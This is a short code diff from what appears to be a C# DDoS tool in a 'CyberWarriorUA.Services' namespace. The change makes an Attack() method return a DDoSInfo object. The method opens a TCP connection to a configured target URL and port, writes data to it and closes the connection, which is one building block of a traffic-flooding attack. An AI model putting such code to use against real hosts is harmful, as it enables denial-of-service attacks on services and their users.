@@ -11,7 +11,7 @@ namespace CyberWarriorUA.Services
         {
         }
 
-        public override async Task Attack()
+        public override async Task<DDoSInfo> Attack()
         {
             var tcpClient = new TcpClient();
             tcpClient.Connect(AttackModel.URL, AttackModel.Port);
@@ -21,7 +21,8 @@ namespace CyberWarriorUA.Services
             await stream.WriteAsync(data, 0, data.Length);
 
             tcpClient.Close();
-            
+
+            return new DDoSInfo();
         }
     }
 }
